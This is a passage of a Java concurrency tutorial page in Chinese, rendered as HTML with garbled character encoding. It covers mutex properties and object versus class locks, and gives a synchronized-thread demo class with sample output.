href="#java6%E4%BB%A5%E5%90%8Esynchronized%E6%80%A7%E8%83%BD%E5%BE%97%E5%88%B0%E4%BA%86%E5%BE%88%E5%A4%A7%E7%9A%84%E6%8F%90%E5%8D%87">Java6ä»¥åï¼Œsynchronizedæ€§èƒ½å¾—åˆ°äº†å¾ˆå¤§çš„æå‡</a></li><li><a href="#%E8%87%AA%E6%97%8B%E9%94%81%E4%B8%8E%E8%87%AA%E9%80%82%E5%BA%94%E8%87%AA%E6%97%8B%E9%94%81">è‡ªæ—‹é”ä¸è‡ªé€‚åº”è‡ªæ—‹é”</a><ul><li><a href="#%E8%87%AA%E6%97%8B%E9%94%81">è‡ªæ—‹é”</a></li><li><a href="#%E8%87%AA%E9%80%82%E5%BA%94%E8%87%AA%E6%97%8B%E9%94%81">è‡ªé€‚åº”è‡ªæ—‹é”</a></li></ul></li><li><a href="#%E9%94%81%E6%B6%88%E9%99%A4">é”æ¶ˆé™¤</a><ul><li><a href="#%E6%9B%B4%E5%BD%BB%E5%BA%95%E7%9A%84%E4%BC%98%E5%8C%96">æ›´å½»åº•çš„ä¼˜åŒ–</a></li></ul></li><li><a href="#%E9%94%81%E7%B2%97%E5%8C%96">é”ç²—åŒ–</a><ul><li><a href="#%E5%8F%A6%E4%B8%80%E7%A7%8D%E6%9E%81%E7%AB%AF">å¦ä¸€ç§æç«¯</a></li></ul></li><li><a href="#synchronized%E7%9A%84%E5%9B%9B%E7%A7%8D%E7%8A%B6%E6%80%81">Synchronizedçš„å››ç§çŠ¶æ€</a><ul><li><a href="#%E5%81%8F%E5%90%91%E9%94%81%E5%87%8F%E5%B0%91%E5%90%8C%E4%B8%80%E7%BA%BF%E7%A8%8B%E8%8E%B7%E5%8F%96%E9%94%81%E7%9A%84%E4%BB%A3%E4%BB%B7-cascompare-and-swap-">åå‘é”ï¼šå‡å°‘åŒä¸€çº¿ç¨‹è·å–é”çš„ä»£ä»· CASï¼ˆCompare and Swapï¼‰ã€-ã€‘</a></li><li><a href="#%E8%BD%BB%E9%87%8F%E7%BA%A7%E9%94%81">è½»é‡çº§é”</a><ul><li><a href="#%E5%8A%A0%E9%94%81%E8%BF%87%E7%A8%8B">åŠ é”è¿‡ç¨‹</a></li><li><a href="#%E8%A7%A3%E9%94%81%E8%BF%87%E7%A8%8B">è§£é”è¿‡ç¨‹</a></li></ul></li></ul></li><li><a href="#%E9%94%81%E7%9A%84%E5%86%85%E5%AD%98%E8%AF%AD%E4%B9%89">é”çš„å†…å­˜è¯­ä¹‰</a></li><li><a href="#%E5%81%8F%E5%90%91%E9%94%81-%E8%BD%BB%E9%87%8F%E7%BA%A7%E9%94%81-%E9%87%8D%E9%87%8F%E7%BA%A7%E9%94%81%E7%9A%84%E6%B1%87%E6%80%BB">åå‘é”ã€è½»é‡çº§é”ã€é‡é‡çº§é”çš„æ±‡æ€»</a></li><li><a href="#synchronized%E5%92%8Creentrantlock">Synchronizedå’ŒReentrantLock</a><ul><li><a href="#reentrantlock%E5%86%8D%E5%85%A5%E9%94%81">ReentrantLockï¼ˆå†å…¥é”ï¼‰</a><ul><li><a href="#reentrantlock%E5%85%AC%E5%B9%B3%E6%80%A7%E7%9A%84%E8%AE%BE%E7%BD%AE">ReentrantLockå…¬å¹³æ€§çš„è®¾ç½®</a></li><li><a href="#reentrantlock%E5%B0%86%E9%94%81%E5%AF%B9%E8%B1%A1%E5%8C%96">ReentrantLockå°†é”å¯¹è±¡åŒ–</a></li><li><a href="#%E8%83%BD%E5%B0%86waitnotifynotifyall%E5%AF%B9%E8%B1%A1%E5%8C%96">èƒ½å°†wait\notify\notifyAllå¯¹è±¡åŒ–</a></li><li><a href="#synchronized%E5%92%8Creentrantlock%E7%9A%84%E5%8C%BA%E5%88%AB%E6%80%BB%E7%BB%93">Synchronizedå’ŒReentrantLockçš„åŒºåˆ«æ€»ç»“</a></li></ul></li></ul></li><li><a href="#%E4%BB%80%E4%B9%88%E6%98%AFjava%E5%86%85%E5%AD%98%E6%A8%A1%E5%9E%8B%E4%B8%AD%E7%9A%84happens-before">ä»€ä¹ˆæ˜¯Javaå†…å­˜æ¨¡å‹ä¸­çš„happens-before</a><ul><li><a href="#java%E5%86%85%E5%AD%98%E6%A8%A1%E5%9E%8Bjmm">Javaå†…å­˜æ¨¡å‹JMM</a></li><li><a href="#jmm%E4%B8%AD%E7%9A%84%E4%B8%BB%E5%86%85%E5%AD%98">JMMä¸­çš„ä¸»å†…å­˜</a></li><li><a href="#jmm%E4%B8%AD%E7%9A%84%E5%B7%A5%E4%BD%9C%E5%86%85%E5%AD%98">JMMä¸­çš„å·¥ä½œå†…å­˜</a></li><li><a href="#jmm%E4%B8%8Ejava%E5%86%85%E5%AD%98%E5%8C%BA%E5%9F%9F%E5%88%92%E5%88%86%E6%98%AF%E4%B8%8D%E5%90%8C%E7%9A%84%E6%A6%82%E5%BF%B5%E5%B1%82%E6%AC%A1">JMMä¸Javaå†…å­˜åŒºåŸŸåˆ’åˆ†æ˜¯ä¸åŒçš„æ¦‚å¿µå±‚æ¬¡</a></li><li><a href="#%E4%B8%BB%E5%86%85%E5%AD%98%E4%B8%8E%E5%B7%A5%E4%BD%9C%E5%86%85%E5%AD%98%E7%9A%84%E6%95%B0%E6%8D%AE%E5%AD%98%E5%82%A8%E7%B1%BB%E5%9E%8B%E4%BB%A5%E5%8F%8A%E6%93%8D%E4%BD%9C%E6%96%B9%E5%BC%8F%E5%BD%92%E7%BA%B3">ä¸»å†…å­˜ä¸å·¥ä½œå†…å­˜çš„æ•°æ®å­˜å‚¨ç±»å‹ä»¥åŠæ“ä½œæ–¹å¼å½’çº³</a></li><li><a href="#%E6%8C%87%E4%BB%A4%E9%87%8D%E6%8E%92%E5%BA%8F%E9%9C%80%E8%A6%81%E6%BB%A1%E8%B6%B3%E7%9A%84%E6%9D%A1%E4%BB%B6">æŒ‡ä»¤é‡æ’åºéœ€è¦æ»¡è¶³çš„æ¡ä»¶</a><ul><li><a href="#a%E6%93%8D%E4%BD%9C%E7%9A%84%E7%BB%93%E6%9E%9C%E9%9C%80%E8%A6%81%E5%AF%B9b%E6%93%8D%E4%BD%9C%E5%8F%AF%E8%A7%81%E5%88%99a%E4%B8%8Eb%E5%AD%98%E5%9C%A8happens-before%E5%85%B3%E7%B3%BB">Aæ“ä½œçš„ç»“æœéœ€è¦å¯¹Bæ“ä½œå¯è§ï¼Œåˆ™Aä¸Bå­˜åœ¨happens-beforeå…³ç³»</a></li><li><a href="#happens-before%E7%9A%84%E5%85%AB%E5%A4%A7%E5%8E%9F%E5%88%99">Happens-beforeçš„å…«å¤§åŸåˆ™</a></li><li><a href="#happens-before%E7%9A%84%E6%A6%82%E5%BF%B5">Happens-beforeçš„æ¦‚å¿µ</a></li><li><a href="#final%E9%87%8D%E6%8E%92%E5%BA%8F">finalé‡æ’åº</a></li><li><a href="#volatilejvm%E6%8F%90%E4%BE%9B%E7%9A%84%E8%BD%BB%E9%87%8F%E7%BA%A7%E5%90%8C%E6%AD%A5%E6%9C%BA%E5%88%B6">Volatileï¼šJVMæä¾›çš„è½»é‡çº§åŒæ­¥æœºåˆ¶</a></li><li><a href="#volatile%E4%B8%8D%E4%BF%9D%E8%AF%81%E5%8E%9F%E5%AD%90%E6%80%A7">Volatileä¸ä¿è¯åŸå­æ€§</a></li><li><a href="#volatile%E5%8F%98%E9%87%8F%E4%B8%BA%E4%BD%95%E7%AB%8B%E5%8D%B3%E5%8F%AF%E8%A7%81">Volatileå˜é‡ä¸ºä½•ç«‹å³å¯è§ï¼Ÿ</a></li><li><a href="#volatile%E5%A6%82%E4%BD%95%E7%A6%81%E6%AD%A2%E9%87%8D%E6%8E%92%E4%BC%98%E5%8C%96">Volatileå¦‚ä½•ç¦æ­¢é‡æ’ä¼˜åŒ–</a></li><li><a href="#%E5%AE%9E%E7%8E%B0%E7%BA%BF%E7%A8%8B%E5%AE%89%E5%85%A8%E7%9A%84%E5%8D%95%E4%BE%8B%E5%86%99%E6%B3%95%E9%94%99%E8%AF%AF%E7%A4%BA%E8%8C%83">å®ç°çº¿ç¨‹å®‰å…¨çš„å•ä¾‹å†™æ³•ï¼ˆé”™è¯¯ç¤ºèŒƒï¼‰</a></li><li><a href="#volatile%E5%92%8Csynchronized%E7%9A%84%E5%8C%BA%E5%88%AB">Volatileå’Œsynchronizedçš„åŒºåˆ«</a></li></ul></li></ul></li><li><a href="#cascompare-and-swap">CASï¼ˆcompare and swapï¼‰</a><ul><li><a href="#%E4%B9%90%E8%A7%82%E9%94%81%E5%92%8C%E6%82%B2%E8%A7%82%E9%94%81">ä¹è§‚é”å’Œæ‚²è§‚é”</a></li><li><a href="#%E4%B8%80%E7%A7%8D%E9%AB%98%E6%95%88%E5%AE%9E%E7%8E%B0%E7%BA%BF%E7%A8%8B%E5%AE%89%E5%85%A8%E6%80%A7%E7%9A%84%E6%96%B9%E6%B3%95">ä¸€ç§é«˜æ•ˆå®ç°çº¿ç¨‹å®‰å…¨æ€§çš„æ–¹æ³•</a></li><li><a href="#cas%E6%80%9D%E6%83%B3">CASæ€æƒ³</a></li><li><a href="#cas%E5%A4%9A%E6%95%B0%E6%83%85%E5%86%B5%E4%B8%8B%E5%AF%B9%E5%BC%80%E5%8F%91%E8%80%85%E6%9D%A5%E8%AF%B4%E6%98%AF%E9%80%8F%E6%98%8E%E7%9A%84">CASå¤šæ•°æƒ…å†µä¸‹å¯¹å¼€å‘è€…æ¥è¯´æ˜¯é€æ˜çš„</a></li><li><a href="#%E7%BC%BA%E7%82%B9">ç¼ºç‚¹</a></li></ul></li><li><a href="#java%E7%BA%BF%E7%A8%8B%E6%B1%A0">Javaçº¿ç¨‹æ± </a><ul><li><a href="#%E5%88%A9%E7%94%A8executors%E5%88%9B%E5%BB%BA%E4%B8%8D%E5%90%8C%E7%9A%84%E7%BA%BF%E7%A8%8B%E6%B1%A0%E6%BB%A1%E8%B6%B3%E4%B8%8D%E5%90%8C%E5%9C%BA%E6%99%AF%E7%9A%84%E9%9C%80%E6%B1%82">åˆ©ç”¨Executorsåˆ›å»ºä¸åŒçš„çº¿ç¨‹æ± æ»¡è¶³ä¸åŒåœºæ™¯çš„éœ€æ±‚</a></li><li><a href="#forkjoin%E6%A1%86%E6%9E%B6">Fork&#x2F;Joinæ¡†æ¶</a></li><li><a href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E4%BD%BF%E7%94%A8%E7%BA%BF%E7%A8%8B%E6%B1%A0">ä¸ºä»€ä¹ˆè¦ä½¿ç”¨çº¿ç¨‹æ± </a></li><li><a href="#executor%E7%9A%84%E6%A1%86%E6%9E%B6">Executorçš„æ¡†æ¶</a></li><li><a href="#juc%E7%9A%84%E4%B8%89%E4%B8%AAexecutor%E6%8E%A5%E5%8F%A3">J.U.Cçš„ä¸‰ä¸ªExecutoræ¥å£</a></li><li><a href="#threadpoolexecutor%E7%9A%84%E6%9E%84%E9%80%A0%E5%87%BD%E6%95%B0">ThreadPoolExecutorçš„æ„é€ å‡½æ•°</a></li><li><a href="#threadpooleecutor">ThreadPoolEecutor</a></li><li><a href="#handler%E7%BA%BF%E7%A8%8B%E6%B1%A0%E7%9A%84%E9%A5%B1%E5%92%8C%E7%AD%96%E7%95%A5">Handler:çº¿ç¨‹æ± çš„é¥±å’Œç­–ç•¥</a></li><li><a href="#%E6%96%B0%E4%BB%BB%E5%8A%A1%E6%8F%90%E4%BA%A4execute%E6%89%A7%E8%A1%8C%E5%90%8E%E7%9A%84%E5%88%A4%E6%96%AD">æ–°ä»»åŠ¡æäº¤executeæ‰§è¡Œåçš„åˆ¤æ–­</a></li><li><a href="#%E7%BA%BF%E7%A8%8B%E6%B1%A0%E7%9A%84%E7%8A%B6%E6%80%81">çº¿ç¨‹æ± çš„çŠ¶æ€</a></li><li><a href="#%E5%B7%A5%E4%BD%9C%E7%BA%BF%E7%A8%8B%E7%9A%84%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F">å·¥ä½œçº¿ç¨‹çš„ç”Ÿå‘½å‘¨æœŸ</a></li><li><a href="#%E7%BA%BF%E7%A8%8B%E6%B1%A0%E7%9A%84%E5%A4%A7%E5%B0%8F%E5%A6%82%E4%BD%95%E9%80%89%E5%AE%9A">çº¿ç¨‹æ± çš„å¤§å°å¦‚ä½•é€‰å®š</a></li></ul></li></ul><!-- tocstop --><h2><span id="çº¿ç¨‹å®‰å…¨é—®é¢˜çš„ä¸»è¦è¯±å› ">çº¿ç¨‹å®‰å…¨é—®é¢˜çš„ä¸»è¦è¯±å› </span></h2><p>Ã˜ å­˜åœ¨å…±äº«æ•°æ®ï¼ˆä¹Ÿç§°ä¸´ç•Œèµ„æºï¼‰</p><p>Ã˜ å­˜åœ¨å¤šæ¡çº¿ç¨‹å…±åŒæ“ä½œè¿™äº›å…±äº«æ•°æ®</p><h3><span id="è§£å†³é—®é¢˜çš„æ ¹æœ¬æ–¹æ³•">è§£å†³é—®é¢˜çš„æ ¹æœ¬æ–¹æ³•</span></h3><p>åŒä¸€æ—¶åˆ»æœ‰ä¸”åªæœ‰ä¸€ä¸ªçº¿ç¨‹åœ¨æ“ä½œå…±äº«æ•°æ®ï¼Œå…¶ä»–çº¿ç¨‹å¿…é¡»ç­‰åˆ°è¯¥çº¿ç¨‹å¤„ç†å®Œæ•°æ®åå†å¯¹å…±äº«æ•°æ®è¿›è¡Œæ“ä½œã€‚</p><h2><span id="äº’æ–¥é”">äº’æ–¥é”</span></h2><h3><span id="äº’æ–¥é”çš„ç‰¹æ€§">äº’æ–¥é”çš„ç‰¹æ€§</span></h3><h4><span id="äº’æ–¥æ€§">äº’æ–¥æ€§</span></h4><p><font color="red">å³åœ¨åŒä¸€æ—¶é—´åªå…è®¸ä¸€ä¸ªçº¿ç¨‹æŒæœ‰æŸä¸ªå¯¹è±¡é”</font>ï¼Œé€šè¿‡è¿™ç§ç‰¹æ€§æ¥å®ç°å¤šçº¿ç¨‹çš„åè°ƒæœºåˆ¶ï¼Œè¿™æ ·åœ¨åŒä¸€æ—¶é—´åªæœ‰ä¸€ä¸ªçº¿ç¨‹å¯¹éœ€è¦åŒæ­¥çš„ä»£ç å—ï¼ˆå¤åˆæ“ä½œï¼‰è¿›è¡Œè®¿é—®ã€‚äº’æ–¥æ€§ä¹Ÿç§°ä¸º<font color="orange"><strong>æ“ä½œçš„åŸå­æ€§ã€‚</strong></font></p><h4><span id="å¯è§æ€§">å¯è§æ€§</span></h4><p><font color="red">å¿…é¡»ç¡®ä¿åœ¨é”è¢«é‡Šæ”¾ä¹‹å‰ï¼Œå¯¹å…±äº«å˜é‡æ‰€åšçš„ä¿®æ”¹ï¼Œå¯¹äºéšåè·å¾—è¯¥é”çš„å¦ä¸€ä¸ªçº¿ç¨‹æ˜¯å¯è§çš„</font>ï¼ˆå³åœ¨è·å–é”æ—¶åº”è·å¾—æœ€æ–°å…±äº«å˜é‡çš„å€¼ï¼‰ï¼Œå¦åˆ™å¦ä¸€ä¸ªçº¿ç¨‹å¯èƒ½æ˜¯åœ¨æœ¬åœ°ç¼“å­˜çš„æŸä¸ªå‰¯æœ¬ä¸Šç»§ç»­æ“ä½œï¼Œä»è€Œå¼•èµ·ä¸ä¸€è‡´ã€‚</p><p><font color="orange"><strong>synchronizedé”çš„ä¸æ˜¯ä»£ç ï¼Œé”çš„éƒ½æ˜¯å¯¹è±¡</strong></font> </p><h2><span id="è·å–å¯¹è±¡">è·å–å¯¹è±¡</span></h2><h3><span id="æ ¹æ®è·å–çš„é”çš„åˆ†ç±»è·å–å¯¹è±¡é”å’Œè·å–ç±»é”">æ ¹æ®è·å–çš„é”çš„åˆ†ç±»ï¼šè·å–å¯¹è±¡é”å’Œè·å–ç±»é”</span></h3><h4><span id="è·å–å¯¹è±¡é”çš„ä¸¤ç§ç”¨æ³•">è·å–å¯¹è±¡é”çš„ä¸¤ç§ç”¨æ³•</span></h4><ol><li><p>åŒæ­¥ä»£ç å—ï¼ˆsynchronizedï¼ˆthisï¼‰ï¼Œsynchronizedï¼ˆç±»å®ä¾‹å¯¹è±¡ï¼‰ï¼‰ï¼Œé”æ˜¯<font color="orange"><strong>å°æ‹¬å·ï¼ˆï¼‰ä¸­çš„å®ä¾‹å¯¹è±¡</strong></font></p></li><li><p>åŒæ­¥éé™æ€æ–¹æ³•ï¼ˆsynchronized methodï¼‰ï¼Œé”æ˜¯<font color="orange"><strong>å½“å‰å¯¹è±¡çš„å®ä¾‹å¯¹è±¡</strong></font></p></li></ol><h4><span id="è·å–ç±»é”çš„ä¸¤ç§ç”¨æ³•">è·å–ç±»é”çš„ä¸¤ç§ç”¨æ³•</span></h4><ol><li><p>åŒæ­¥ä»£ç å—ï¼ˆsynchronizedï¼ˆç±».classï¼‰ï¼‰ï¼Œé”æ˜¯å°æ‹¬å·ï¼ˆï¼‰ä¸­çš„ç±»å¯¹è±¡ï¼ˆClasså¯¹è±¡ï¼‰ã€‚</p></li><li><p>åŒæ­¥é™æ€æ–¹æ³•ï¼ˆsynchronized static methodï¼‰ï¼Œé”æ˜¯å½“å‰å¯¹è±¡çš„<font color="red">ç±»å¯¹è±¡</font>ï¼ˆClasså¯¹è±¡ï¼‰</p></li></ol><p><img src="/2020/04/06/mt/image-20200406094616354.png"></p><p>é”å’Œè·å–ç±»é”</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.interview.javabasic.thread;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.text.SimpleDateFormat;</span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SyncThread</span> <span class="keyword">implements</span> <span class="title class_">Runnable</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">threadName</span> <span class="operator">=</span> Thread.currentThread().getName();</span><br><span class="line">        <span class="keyword">if</span> (threadName.startsWith(<span class="string">&quot;A&quot;</span>)) &#123;</span><br><span class="line">            async();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (threadName.startsWith(<span class="string">&quot;B&quot;</span>)) &#123;</span><br><span class="line">            syncObjectBlock1();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (threadName.startsWith(<span class="string">&quot;C&quot;</span>)) &#123;</span><br><span class="line">            syncObjectMethod1();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (threadName.startsWith(<span class="string">&quot;D&quot;</span>)) &#123;</span><br><span class="line">            syncClassBlock1();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (threadName.startsWith(<span class="string">&quot;E&quot;</span>)) &#123;</span><br><span class="line">            syncClassMethod1();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * å¼‚æ­¥æ–¹æ³•</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">async</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            System.out.println(Thread.currentThread().getName() + <span class="string">&quot;_Async_Start: &quot;</span> + <span class="keyword">new</span> <span class="title class_">SimpleDateFormat</span>(<span class="string">&quot;HH:mm:ss&quot;</span>).format(<span class="keyword">new</span> <span class="title class_">Date</span>()));</span><br><span class="line">            Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">            System.out.println(Thread.currentThread().getName() + <span class="string">&quot;_Async_End: &quot;</span> + <span class="keyword">new</span> <span class="title class_">SimpleDateFormat</span>(<span class="string">&quot;HH:mm:ss&quot;</span>).format(<span class="keyword">new</span> <span class="title class_">Date</span>()));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * æ–¹æ³•ä¸­æœ‰ synchronized(this|object) &#123;&#125; åŒæ­¥ä»£ç å—</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">syncObjectBlock1</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(Thread.currentThread().getName() + <span class="string">&quot;_SyncObjectBlock1: &quot;</span> + <span class="keyword">new</span> <span class="title class_">SimpleDateFormat</span>(<span class="string">&quot;HH:mm:ss&quot;</span>).format(<span class="keyword">new</span> <span class="title class_">Date</span>()));</span><br><span class="line">        <span class="keyword">synchronized</span> (<span class="built_in">this</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                System.out.println(Thread.currentThread().getName() + <span class="string">&quot;_SyncObjectBlock1_Start: &quot;</span> + <span class="keyword">new</span> <span class="title class_">SimpleDateFormat</span>(<span class="string">&quot;HH:mm:ss&quot;</span>).format(<span class="keyword">new</span> <span class="title class_">Date</span>()));</span><br><span class="line">                Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">                System.out.println(Thread.currentThread().getName() + <span class="string">&quot;_SyncObjectBlock1_End: &quot;</span> + <span class="keyword">new</span> <span class="title class_">SimpleDateFormat</span>(<span class="string">&quot;HH:mm:ss&quot;</span>).format(<span class="keyword">new</span> <span class="title class_">Date</span>()));</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * synchronized ä¿®é¥°éé™æ€æ–¹æ³•</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">syncObjectMethod1</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(Thread.currentThread().getName() + <span class="string">&quot;_SyncObjectMethod1: &quot;</span> + <span class="keyword">new</span> <span class="title class_">SimpleDateFormat</span>(<span class="string">&quot;HH:mm:ss&quot;</span>).format(<span class="keyword">new</span> <span class="title class_">Date</span>()));</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            System.out.println(Thread.currentThread().getName() + <span class="string">&quot;_SyncObjectMethod1_Start: &quot;</span> + <span class="keyword">new</span> <span class="title class_">SimpleDateFormat</span>(<span class="string">&quot;HH:mm:ss&quot;</span>).format(<span class="keyword">new</span> <span class="title class_">Date</span>()));</span><br><span class="line">            Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">            System.out.println(Thread.currentThread().getName() + <span class="string">&quot;_SyncObjectMethod1_End: &quot;</span> + <span class="keyword">new</span> <span class="title class_">SimpleDateFormat</span>(<span class="string">&quot;HH:mm:ss&quot;</span>).format(<span class="keyword">new</span> <span class="title class_">Date</span>()));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">syncClassBlock1</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(Thread.currentThread().getName() + <span class="string">&quot;_SyncClassBlock1: &quot;</span> + <span class="keyword">new</span> <span class="title class_">SimpleDateFormat</span>(<span class="string">&quot;HH:mm:ss&quot;</span>).format(<span class="keyword">new</span> <span class="title class_">Date</span>()));</span><br><span class="line">        <span class="keyword">synchronized</span> (SyncThread.class) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                System.out.println(Thread.currentThread().getName() + <span class="string">&quot;_SyncClassBlock1_Start: &quot;</span> + <span class="keyword">new</span> <span class="title class_">SimpleDateFormat</span>(<span class="string">&quot;HH:mm:ss&quot;</span>).format(<span class="keyword">new</span> <span class="title class_">Date</span>()));</span><br><span class="line">                Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">                System.out.println(Thread.currentThread().getName() + <span class="string">&quot;_SyncClassBlock1_End: &quot;</span> + <span class="keyword">new</span> <span class="title class_">SimpleDateFormat</span>(<span class="string">&quot;HH:mm:ss&quot;</span>).format(<span class="keyword">new</span> <span class="title class_">Date</span>()));</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">synchronized</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">syncClassMethod1</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(Thread.currentThread().getName() + <span class="string">&quot;_SyncClassMethod1: &quot;</span> + <span class="keyword">new</span> <span class="title class_">SimpleDateFormat</span>(<span class="string">&quot;HH:mm:ss&quot;</span>).format(<span class="keyword">new</span> <span class="title class_">Date</span>()));</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            System.out.println(Thread.currentThread().getName() + <span class="string">&quot;_SyncClassMethod1_Start: &quot;</span> + <span class="keyword">new</span> <span class="title class_">SimpleDateFormat</span>(<span class="string">&quot;HH:mm:ss&quot;</span>).format(<span class="keyword">new</span> <span class="title class_">Date</span>()));</span><br><span class="line">            Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">            System.out.println(Thread.currentThread().getName() + <span class="string">&quot;_SyncClassMethod1_End: &quot;</span> + <span class="keyword">new</span> <span class="title class_">SimpleDateFormat</span>(<span class="string">&quot;HH:mm:ss&quot;</span>).format(<span class="keyword">new</span> <span class="title class_">Date</span>()));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œ A B C</p><p><img src="/2020/04/06/mt/image-20200406094654012.png"></p><p>ç»“æœå¦‚ä¸‹ï¼š </p><p><strong><font color="orange">A_thread2_Async_Start: 10:53:42</font></strong></p><p><strong><font color="blue">B_thread2_SyncObjectBlock1: 10:53:42</font></strong></p><p><strong>C_thread1_SyncObjectMethod1: 10:53:42</strong></p><p><strong><font color="blue">B_thread1_SyncObjectBlock1: 10:53:42</font></strong></p><p><strong><font color="orange">A_thread1_Async_Start: 10:53:42</font></strong></p><p><strong>C_thread1_SyncObjectMethod1_Start: 10:53:42</strong></p><p><strong><font color="orange">A_thread2_Async_End: 10:53:43</font></strong></p><p><strong><font color="orange">A_thread1_Async_End: 10:53:43</font></strong></p><p><strong>C_thread1_SyncObjectMethod1_End: 10:53:43</strong></p><p><strong><font color="blue">B_thread1_SyncObjectBlock1_Start: 10:53:43</font></strong></p><p><strong><font color="blue">B_thread1_SyncObjectBlock1_End: 10:53:44</font></strong></p><p><strong><font color="blue">B_thread2_SyncObjectBlock1_Start: 10:53:44</font></strong></p><p><strong><font color="blue">B_thread2_SyncObjectBlock1_End: 10:53:45</font></strong></p><p><strong>C_thread2_SyncObjectMethod1: 10:53:45</strong></p><p><strong>C_thread2_SyncObjectMethod1_Start: 10:53:45</strong></p><p><strong>C_thread2_SyncObjectMethod1_End: 